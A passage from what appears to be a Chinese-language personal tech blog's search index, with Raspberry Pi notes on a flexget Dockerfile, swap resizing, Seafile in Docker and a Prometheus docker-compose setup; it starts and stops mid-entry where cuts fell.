-a</code>我自己想的<br>有機會看到<br>登入p883就能知道IP</p>\n<p>最後，只要有開ssh跟wifi後樹梅派接電就能ssh控制使用，真的很方便<br>留著下次用的時候再翻閱XD</p>\n"},{"title":"Raspberry Pi 使用 Docker 架設 flexget","url":"/blog/2020/01/08/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/","content":"<p>之前 PI 1號機裝 <a href=\"https://blog.hypriot.com/post/hypriotos-back-again-with-docker-on-arm/\" target=\"_blank\" rel=\"noopener\">HypriotOS: Back Again and Better then Ever · Docker Pirates ARMed with explosive stuff</a><br>內建 Docker 不需要手動安裝<br>相關教學可以看</p>\n<ul>\n<li><a href=\"http://blog.itist.tw/2017/06/how-to-install-docker-ce-with-raspbian-jessie.html\" target=\"_blank\" rel=\"noopener\">如何在 Raspberry Pi 上安裝 Docker CE | IT 技術家</a></li>\n<li><a href=\"https://openhome.cc/Gossip/CodeData/DockerLayman/DockerLayman2.html\" target=\"_blank\" rel=\"noopener\">在 Raspberry Pi 2 運行 Docker</a></li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"相關-arm-Image-選擇\"><a href=\"#相關-arm-Image-選擇\" class=\"headerlink\" title=\"相關 arm Image 選擇\"></a>相關 arm Image 選擇</h2><p>相關尋找來源可以看<a href=\"https://hub.docker.com/u/armhf/\" target=\"_blank\" rel=\"noopener\">armhf’s Profile - Docker Hub</a><br>後來注意到<strong>DEPRECATED</strong><br>裡面有建議從 <a href=\"https://hub.docker.com/u/arm32v7/\" target=\"_blank\" rel=\"noopener\">arm32v7</a> 和 <a href=\"https://hub.docker.com/u/arm32v6/\" target=\"_blank\" rel=\"noopener\">arm32v6</a> 去找<br>發現 arm32v7 我的 PI 1 不能用， PI 1 要使用 arm32v6 </p>\n<h2 id=\"安裝-flexget\"><a href=\"#安裝-flexget\" class=\"headerlink\" title=\"安裝 flexget\"></a>安裝 flexget</h2><p>目前測試網路上的 <a href=\"https://github.com/breneser/flexget-arm\" target=\"_blank\" rel=\"noopener\">breneser/flexget-arm: docker container for running flexget</a><br>可以順利安裝</p>\n<h3 id=\"安裝-flexget-最新版方法\"><a href=\"#安裝-flexget-最新版方法\" class=\"headerlink\" title=\"安裝 flexget 最新版方法\"></a>安裝 flexget 最新版方法</h3><p>其實把 image 換成 Python3 image 重新 build 就可以了</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> arm32v6/python:<span class=\"number\">3.8</span>.<span class=\"number\">1</span>-alpine3.<span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> bren</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apk add --update \\</span></span><br><span class=\"line\"><span class=\"bash\">  tzdata \\</span></span><br><span class=\"line\"><span class=\"bash\">  python \\</span></span><br><span class=\"line\"><span class=\"bash\">  py-pip \\</span></span><br><span class=\"line\"><span class=\"bash\">  ca-certificates \\</span></span><br><span class=\"line\"><span class=\"bash\">  &amp;&amp; pip install --no-cache-dir --<span class=\"built_in\">disable</span>-pip-version-check flexget transmissionrpc \\</span></span><br><span class=\"line\"><span class=\"bash\">  &amp;&amp; rm -rf /var/cache/apk/*</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Copy local files</span></span></span><br><span class=\"line\"><span class=\"bash\">COPY files/ /</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># add default volumes</span></span></span><br><span class=\"line\"><span class=\"bash\">VOLUME /config /data</span></span><br><span class=\"line\"><span class=\"bash\">WORKDIR /config</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># expose port for flexget webui</span></span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 3539 3539/tcp</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># run init.sh to set uid, gid, permissions and to launch flexget</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN chmod +x /scripts/init.sh</span></span><br><span class=\"line\"><span class=\"bash\">CMD [<span class=\"string\">\"/scripts/init.sh\"</span>]</span></span><br></pre></td></tr></table></figure>\n<p>相關版本可以從<a href=\"https://hub.docker.com/r/arm32v6/python/\" target=\"_blank\" rel=\"noopener\">arm32v6/python - Docker Hub</a> Tag上去挑版本<br><a href=\"https://hub.docker.com/r/arm32v6/python/tags\" target=\"_blank\" rel=\"noopener\">arm32v6/python Tags - Docker Hub</a></p>\n<h2 id=\"alpine-開-bash-方法\"><a href=\"#alpine-開-bash-方法\" class=\"headerlink\" title=\"alpine 開 bash 方法\"></a>alpine 開 bash 方法</h2><p>在 docker 內建沒有 bash</p>\n<p>在 dockerfile 裝<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RUN apk add --update bash &amp;&amp; rm -rf /var/cache/apk/*</span><br></pre></td></tr></table></figure></p>\n<p>參考<a href=\"https://github.com/smebberson/docker-alpine/issues/43#issuecomment-226970518\" target=\"_blank\" rel=\"noopener\">https://github.com/smebberson/docker-alpine/issues/43#issuecomment-226970518</a></p>\n<h2 id=\"usr-share-zoneinfo-xxxx-No-such-file-or-directory\"><a href=\"#usr-share-zoneinfo-xxxx-No-such-file-or-directory\" class=\"headerlink\" title=\"/usr/share/zoneinfo/xxxx: No such file or directory\"></a>/usr/share/zoneinfo/xxxx: No such file or directory</h2><p>tzdata 安裝這個能解決 上敘述問題<br>參考 <a href=\"https://kejyuntw.gitbooks.io/ubuntu-learning-notes/system/system-date.html\" target=\"_blank\" rel=\"noopener\">時間 · ubuntu 學習筆記</a><br>用 alpine 應該會遇到這個問題</p>\n<h2 id=\"最後…\"><a href=\"#最後…\" class=\"headerlink\" title=\"最後…\"></a>最後…</h2><p>最後發現 新版沒有 Config Editor<br>所以默默裝回去<br>有看到 <a href=\"https://github.com/Flexget/webui/projects/3\" target=\"_blank\" rel=\"noopener\">Config Editor</a><br>看來好像還沒完成</p>\n<p>順便留一下版本紀錄<br>Version info<br>Flexget: 2.21.35<br>API: 1.5.0</p>\n<h2 id=\"其他沒相關的紀錄\"><a href=\"#其他沒相關的紀錄\" class=\"headerlink\" title=\"其他沒相關的紀錄\"></a>其他沒相關的紀錄</h2><p>最近查有沒有監聽檔案新增方法，有找到 inotify-tool<br>目前尚未整理，先貼到這邊…預防沒寫</p>\n<ul>\n<li><a href=\"https://github.com/prashanthpai/sof-object-listing/tree/master/inotify\" target=\"_blank\" rel=\"noopener\">sof-object-listing/inotify at master · prashanthpai/sof-object-listing</a></li>\n<li><a href=\"https://www.centos.bz/2012/06/inotify-tools-introduction/\" target=\"_blank\" rel=\"noopener\">inotify-tools使用方法介绍-Linux运维日志</a></li>\n<li><a href=\"https://noter.tw/26/ubuntu-%E8%8B%A5%E6%AA%94%E6%A1%88%E9%80%99%E6%A8%A3%EF%BC%8C%E5%B0%B1%E9%82%A3%E6%A8%A3%E7%9A%84%E5%A5%BD%E7%89%A9-inotify-tools/\" target=\"_blank\" rel=\"noopener\">Ubuntu 若檔案這樣，就那樣的好物 inotify-tools » 記下來 - 專業偽筆記</a></li>\n<li><a href=\"https://chaihongjun.me/os/linux/286.html\" target=\"_blank\" rel=\"noopener\">inotify-tools工具inotifywatch实时监控网站目录_chaihongjun.me|柴宏俊web技术笔记</a></li>\n<li><a href=\"https://article.itxueyuan.com/WA56x\" target=\"_blank\" rel=\"noopener\">inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒</a></li>\n</ul>\n<p>相關未整理彩蛋</p>\n<ul>\n<li><a href=\"https://hub.docker.com/r/arm32v6/python/tags\" target=\"_blank\" rel=\"noopener\">arm32v6/python Tags - Docker Hub</a></li>\n<li><a href=\"https://github.com/smebberson/docker-alpine/issues/43\" target=\"_blank\" rel=\"noopener\">docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine</a></li>\n<li><a href=\"https://get-ytt.io/#example:example-variable\" target=\"_blank\" rel=\"noopener\">ytt - YAML Templating Tool</a></li>\n<li><a href=\"https://flexget.com/Web-UI\" target=\"_blank\" rel=\"noopener\">FlexGet</a></li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments\" target=\"_blank\" rel=\"noopener\">Better Comments - Visual Studio Marketplace</a></li>\n<li><a href=\"moz-extension://55de8dc9-68eb-48ea-93fa-9d8190675ab1/newtab.html\" target=\"_blank\" rel=\"noopener\">30 Seconds of Knowledge</a></li>\n<li><a href=\"https://learnku.com/articles/9001/function-parameter-problems-encountered-by-upgrading-from-php52-to-php71\" target=\"_blank\" rel=\"noopener\">从 PHP5.2 升级到 PHP7.1 遇到的函数参数问题 | Laravel China 社区</a></li>\n<li><a href=\"https://github.com/s3fs-fuse/s3fs-fuse/issues/798\" target=\"_blank\" rel=\"noopener\">Incredibly slow upload speeds · Issue #798 · s3fs-fuse/s3fs-fuse</a></li>\n<li><a href=\"https://serverfault.com/questions/396100/s3fs-performance-improvements-or-alternative\" target=\"_blank\" rel=\"noopener\">amazon ec2 - S3fs performance improvements or alternative? - Server Fault</a></li>\n<li><a href=\"https://stackoverflow.com/questions/16428552/how-can-i-mount-an-s3-bucket-to-an-ec2-instance-and-write-to-it-with-php\" target=\"_blank\" rel=\"noopener\">amazon s3 - How can I mount an S3 bucket to an EC2 instance and write to it with PHP? - Stack Overflow</a></li>\n<li><a href=\"https://lingxiankong.github.io/2017-07-28-s3curl-swift.html\" target=\"_blank\" rel=\"noopener\">使用 s3curl 访问 OpenStack Swift</a></li>\n<li><a href=\"https://stackoverflow.com/questions/44751574/uploading-to-amazon-s3-via-curl-route\" target=\"_blank\" rel=\"noopener\">spring - Uploading to Amazon S3 via curl route - Stack Overflow</a></li>\n<li><a href=\"https://github.com/deepsentry/aws-s3-curl\" target=\"_blank\" rel=\"noopener\">deepsentry/aws-s3-curl: Upload a file to a S3 bucket</a></li>\n<li><a href=\"https://juejin.im/post/5cd0178151882542616c4a23\" target=\"_blank\" rel=\"noopener\">redis消息队列简单应用 - 掘金</a></li>\n<li><a href=\"https://www.cnblogs.com/lenve/p/12100698.html\" target=\"_blank\" rel=\"noopener\">手码两万余字，SpringMVC 包教包会 - 江南一点雨 - 博客园</a></li>\n<li><a href=\"https://blog.csdn.net/cws1214/article/details/21440691\" target=\"_blank\" rel=\"noopener\">使用curl和wget发送post请求_cws1214的专栏-CSDN博客</a></li>\n<li><a href=\"https://dotblogs.com.tw/liguobao/2018/12/30/132746\" target=\"_blank\" rel=\"noopener\">年轻人的第一个OAuth2.0 Server-Hydra | 一只程序汪的自我修养 - 點部落</a></li>\n<li><a href=\"https://carsonwah.github.io/http-authentication.html\" target=\"_blank\" rel=\"noopener\">開發者必備知識 - HTTP認證（HTTP Authentication） - Carson’s Tech Note</a></li>\n<li><a href=\"https://github.com/thephpleague/oauth2-server\" target=\"_blank\" rel=\"noopener\">thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server</a></li>\n<li><a href=\"https://github.com/schemalex/schemalex\" target=\"_blank\" rel=\"noopener\">schemalex/schemalex: Generate difference sql of two mysql schema</a></li>\n<li><a href=\"https://github.com/GoogleCloudPlatform/gcsfuse/issues/22\" target=\"_blank\" rel=\"noopener\">Basic performance testing · Issue #22 · GoogleCloudPlatform/gcsfuse</a></li>\n<li><a href=\"http://www.matools.com/lang-cht/blog/190383692\" target=\"_blank\" rel=\"noopener\">Laravel 和 Spring Boot 兩個 框架 比較創業篇（ 一： 開發效率） - 好文 - 码工具</a></li>\n<li><a href=\"https://yylin1.github.io/2019/01/28/portainer-set-tls/\" target=\"_blank\" rel=\"noopener\">Portainer 透過 TLS 認證 - Yi Yang’s Blog</a></li>\n<li><a href=\"https://kejyuntw.gitbooks.io/ubuntu-learning-notes/system/system-date.html\" target=\"_blank\" rel=\"noopener\">時間 · ubuntu 學習筆記</a></li>\n<li><a href=\"https://github.com/smebberson/docker-alpine/issues/43\" target=\"_blank\" rel=\"noopener\">docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine</a></li>\n</ul>\n","categories":["Linux"],"tags":["docker","pi","flexget"]},{"title":"Raspberry Pi 調整 swap 虛擬記憶體","url":"/blog/2021/04/04/Raspberry-Pi-%E8%AA%BF%E6%95%B4-swap-%E8%99%9B%E6%93%AC%E8%A8%98%E6%86%B6%E9%AB%94/","content":"<p>最近用 prometheus 設定兩台樹梅派<br>Swap 吃到99%~100%<br>樹梅派預設都是設定100MB<br>目前曾經 transmission 有因為記憶體不足關係<br>有中斷過…，因為記憶體關係</p>\n<a id=\"more\"></a>\n<p>調大 SWAP 參考<a href=\"https://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/\" target=\"_blank\" rel=\"noopener\">樹莓派 Raspberry Pi 記憶體不足當機？調整 Swap 交換空間大小解決 - G. T. Wang</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/dphys-swapfile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 100MB設定注解</span></span><br><span class=\"line\"><span class=\"comment\"># 設定 CONF_SWAPFACTOR=2</span></span><br><span class=\"line\">sudo service dphys-swapfile restart</span><br></pre></td></tr></table></figure>\n<p>完成<br>再觀查這幾個還會不會吃到快滿狀況</p>\n","categories":["Linux"],"tags":["linux","swap"]},{"title":"Raspberry Pi 使用 Seafile 初體驗","url":"/blog/2020/10/12/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>之前使用<a href=\"https://malagege.github.io/blog/2018/09/16/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/#more\">NextCloud 使用docker簡易安裝筆記 | 程式狂想筆記</a><br>登入頁面就要等了老半天<br>進去聽歌點一首歌也要等一下<br>原本以為他上傳檔案有做加解密<br>但我後來發現 NextCloud PI 預設沒打開<br>把幾個套件拿掉也一樣慢</p>\n<p>不過也又 NextCloud 一陣子<br>因為他竟然有支援 Chrome Media Hub<br>可進行上一首、下一首<br><img src=\"https://storage.googleapis.com/gweb-uniblog-publish-prod/original_images/Chrome_Media_Control.gif\" alt=\"\"><br><a href=\"https://blog.google/products/chrome/manage-audio-and-video-in-chrome/\" target=\"_blank\" rel=\"noopener\">Manage audio and video in Chrome with one click</a><br>可算非常方便</p>\n<p>但最近我覺得太慢了<br>原本以為是 CPU 的問題<br>後來看到官網說是 IO 速度太慢<br>所以我最近在找找有沒有替代方案</p>\n<a id=\"more\"></a>\n<h2 id=\"相關其他搜尋\"><a href=\"#相關其他搜尋\" class=\"headerlink\" title=\"相關其他搜尋\"></a>相關其他搜尋</h2><p>以下幾乎是資料夾內容同步，目前沒使用就先不研究</p>\n<ul>\n<li><a href=\"https://lala.im/7154.html\" target=\"_blank\" rel=\"noopener\">Sharry：一个非常好用的文件分享程序-荒岛</a></li>\n<li><a href=\"https://lala.im/4737.html\" target=\"_blank\" rel=\"noopener\">ResilioSync：公私兼备的同步盘-荒岛</a></li>\n<li><a href=\"https://lala.im/4731.html\" target=\"_blank\" rel=\"noopener\">使用Syncthing自建私有同步盘-荒岛</a></li>\n<li><a href=\"https://lala.im/6617.html\" target=\"_blank\" rel=\"noopener\">Dropit：一个简洁的文件上传工具-荒岛</a></li>\n<li><a href=\"https://lala.im/4698.html\" target=\"_blank\" rel=\"noopener\">CozyCloud：基于GO语言开发的网盘/同步盘-荒岛</a><br>CozyCloud 是 Golang 寫的，沒有音樂播放功能，感覺跟 seafile 差不多<br>之後會再嘗試看看，主要看有沒有不加密檔案功能</li>\n</ul>\n<h2 id=\"Seafile\"><a href=\"#Seafile\" class=\"headerlink\" title=\"Seafile\"></a>Seafile</h2><h3 id=\"優點、缺點\"><a href=\"#優點、缺點\" class=\"headerlink\" title=\"優點、缺點\"></a>優點、缺點</h3><h4 id=\"優點\"><a href=\"#優點\" class=\"headerlink\" title=\"優點\"></a>優點</h4><ol>\n<li>速度比 NextCloud 快</li>\n<li>基本檔案上傳管理功能都有</li>\n<li>可以編輯 Markdown 檔案</li>\n</ol>\n<p>我目前只想到這樣 = =a<br>但這個就夠讓人跳了</p>\n<h4 id=\"缺點\"><a href=\"#缺點\" class=\"headerlink\" title=\"缺點\"></a>缺點</h4><ol>\n<li>NextCloud 很多功能都沒有 (DLNA,Media Hub)</li>\n<li>檔案上傳一定會做加密，不能手動關掉(聽說是為了做歷程關係)</li>\n<li>上傳大檔案可能 PI 會等很久(可能再加密部分) 我有測試 1GB 大概也要卡很久</li>\n</ol>\n<h3 id=\"音樂解決方案\"><a href=\"#音樂解決方案\" class=\"headerlink\" title=\"音樂解決方案\"></a>音樂解決方案</h3><p><a href=\"https://www.clementine-player.org/zh_TW/\" target=\"_blank\" rel=\"noopener\">Clementine 音樂播放器</a></p>\n<p>裝這個撥放器可以跟 Seafile 串接<br>目前介面還算能接受<br>音樂不會全部抓到硬碟<br>這個可能我還滿需要這樣的</p>\n<p>我有看到他有支援 Subsonic<br>但是我使用覺得介面不是很好用用</p>\n<p>大缺點就是需要安裝撥放器</p>\n<h2 id=\"輕鬆使用-docker-體驗-Seafile\"><a href=\"#輕鬆使用-docker-體驗-Seafile\" class=\"headerlink\" title=\"輕鬆使用 docker 體驗 Seafile\"></a>輕鬆使用 docker 體驗 Seafile</h2><h3 id=\"build-images\"><a href=\"#build-images\" class=\"headerlink\" title=\"build images\"></a>build images</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 請使用 Root 權限，官網是這樣說的。但我看裡面語法沒什麼問題</span></span><br><span class=\"line\"><span class=\"comment\"># 感覺怕權限失敗</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/domenukk/seafile-docker-pi.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ./seafile-docker-pi/image</span><br><span class=\"line\">make base &amp;&amp; make server</span><br></pre></td></tr></table></figure>\n<h3 id=\"run\"><a href=\"#run\" class=\"headerlink\" title=\"run\"></a>run</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name seafile   \\</span><br><span class=\"line\">-e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888  \\</span><br><span class=\"line\">-p 8888:80 \\</span><br><span class=\"line\">seafileltd/seafile:pi</span><br></pre></td></tr></table></figure>\n<p>因為我 80 已經有用 NextCloud<br>執行會有點久，你看他的 log 看起來完成<br>其實還沒有跑完，等一回就好了</p>\n<p>https 下次應該會考慮就 Caddy 去做反向代理<br><a href=\"https://blog.wu-boy.com/2019/01/traefik-docker-and-lets-encrypt/\" target=\"_blank\" rel=\"noopener\">Traefik 搭配 Docker 自動更新 Let’s Encrypt 憑證 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a><br>不過也有考慮使用 Traefik</p>\n<p>預設帳號密碼是 <a href=\"mailto:`me@example.com\" target=\"_blank\" rel=\"noopener\">`me@example.com</a><code>/</code>asecret`</p>\n<p>相關教學<a href=\"https://manual-cn-origin.seafile.com/deploy/deploy_with_docker\" target=\"_blank\" rel=\"noopener\">用Docker部署 Seafile 服务 - Seafile服务器手册中文版</a></p>\n<h4 id=\"自訂密碼\"><a href=\"#自訂密碼\" class=\"headerlink\" title=\"自訂密碼\"></a>自訂密碼</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name seafile \\</span><br><span class=\"line\">  -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\</span><br><span class=\"line\">  -e SEAFILE_ADMIN_EMAIL=me@example.com \\</span><br><span class=\"line\">  -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\</span><br><span class=\"line\">  -v /opt/seafile-data:/shared \\</span><br><span class=\"line\">  -p 80:80 \\</span><br><span class=\"line\">  seafileltd/seafile:pi</span><br></pre></td></tr></table></figure>\n<h4 id=\"Let’s-encrypt-SSL-certificate\"><a href=\"#Let’s-encrypt-SSL-certificate\" class=\"headerlink\" title=\"Let’s encrypt SSL certificate\"></a>Let’s encrypt SSL certificate</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name seafile \\</span><br><span class=\"line\">  -e SEAFILE_SERVER_LETSENCRYPT=<span class=\"literal\">true</span> \\</span><br><span class=\"line\">  -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\</span><br><span class=\"line\">  -e SEAFILE_ADMIN_EMAIL=me@example.com \\</span><br><span class=\"line\">  -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\</span><br><span class=\"line\">  -v /opt/seafile-data:/shared \\</span><br><span class=\"line\">  -p 80:80 \\</span><br><span class=\"line\">  -p 443:443 \\</span><br><span class=\"line\">  seafileltd/seafile:pi</span><br></pre></td></tr></table></figure>\n<h4 id=\"修改設定重啟-Seafile\"><a href=\"#修改設定重啟-Seafile\" class=\"headerlink\" title=\"修改設定重啟 Seafile\"></a>修改設定重啟 Seafile</h4><p>設定檔路徑 <code>shared/seafile/conf</code></p>\n<p>docker restart seafile</p>\n<h4 id=\"加一個管理者\"><a href=\"#加一個管理者\" class=\"headerlink\" title=\"加一個管理者\"></a>加一個管理者</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it seafile /opt/seafile/seafile-server-latest/reset-admin.sh</span><br></pre></td></tr></table></figure>\n<h4 id=\"檔案路徑\"><a href=\"#檔案路徑\" class=\"headerlink\" title=\"檔案路徑\"></a>檔案路徑</h4><p>/shared 為根路徑</p>\n<p>-v /opt/seafile-data:/shared </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name seafile   \\</span><br><span class=\"line\">-e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888  \\</span><br><span class=\"line\">-p 8888:80 \\</span><br><span class=\"line\">-v /media/USBdrive/seafile-data:/shared \\</span><br><span class=\"line\">seafileltd/seafile:pi</span><br></pre></td></tr></table></figure>\n<h4 id=\"垃圾回收\"><a href=\"#垃圾回收\" class=\"headerlink\" title=\"垃圾回收\"></a>垃圾回收</h4><p>docker exec seafile /scripts/gc.sh.</p>\n<h3 id=\"其他相關文章\"><a href=\"#其他相關文章\" class=\"headerlink\" title=\"其他相關文章\"></a>其他相關文章</h3><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/140289336\" target=\"_blank\" rel=\"noopener\">树莓派部署 seafile 和 nextcloud 比较 - 知乎</a></li>\n<li><a href=\"https://github.com/domenukk/seafile-docker-pi\" target=\"_blank\" rel=\"noopener\">domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition</a></li>\n<li><a href=\"https://lala.im/671.html\" target=\"_blank\" rel=\"noopener\">开源的私有云网盘程序Seafile安装教程-荒岛</a></li>\n</ul>\n","categories":["Linux"],"tags":["nextcloud","seafile"]},{"title":"Raspberry Pi 部屬 Prometheus","url":"/blog/2021/04/05/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/","content":"<p>參考:<a href=\"https://github.com/Kev1nChan/docker-prometheus/blob/master/docker-compose.yml\" target=\"_blank\" rel=\"noopener\">docker-prometheus/docker-compose.yml at master · Kev1nChan/docker-prometheus · GitHub</a></p>\n<p><strong>使用 Raspberry Pi 3/4 注意使用 32 位元都會有機會遇到記憶體問題</strong><br>建議使用 64 bit<br><code>uname -m</code><br>不是 arrch64 都是 32bit</p>\n<a id=\"more\"></a>\n<h2 id=\"架設-Prometheus\"><a href=\"#架設-Prometheus\" class=\"headerlink\" title=\"架設 Prometheus\"></a>架設 Prometheus</h2><p>調整部份 Raspberry PI</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3.3'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">volumes:</span></span><br><span class=\"line\"><span class=\"attr\">  prometheus_data:</span> <span class=\"string\">&#123;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">  grafana_data:</span> <span class=\"string\">&#123;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  monitoring:</span></span><br><span class=\"line\"><span class=\"attr\">    driver:</span> <span class=\"string\">bridge</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  prometheus:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">prom/prometheus:v2.26.0</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">prometheus</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">$PWD/prometheus/:/etc/prometheus/</span></span><br><span class=\"line\"><span class=\"attr\">      - prometheus_data:</span><span class=\"string\">/prometheus</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--config.file=/etc/prometheus/prometheus.yml'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--storage.tsdb.path=/prometheus'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--web.console.libraries=/usr/share/prometheus/console_libraries'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--web.console.templates=/usr/share/prometheus/consoles'</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    links:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">alertmanager</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">cadvisor</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'9090'</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">9090</span><span class=\"string\">:9090</span></span><br><span class=\"line\"><span class=\"attr\">    depends_on:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">cadvisor</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  alertmanager:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">prom/alertmanager:v0.21.0</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">alertmanager</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">$PWD/alertmanager/:/etc/alertmanager/</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--config.file=/etc/alertmanager/config.yml'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--storage.path=/alertmanager'</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'9093'</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">9093</span><span class=\"string\">:9093</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  cadvisor:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span>  <span class=\"string\">budry/cadvisor-arm:latest</span> <span class=\"comment\">#gcr.io/cadvisor/cadvisor:v0.39.0</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">cadvisor</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/:/rootfs:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/var/run:/var/run:rw</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/sys:/sys:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/var/lib/docker/:/var/lib/docker:ro</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'8080'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  node_exporter:</span></span><br><span 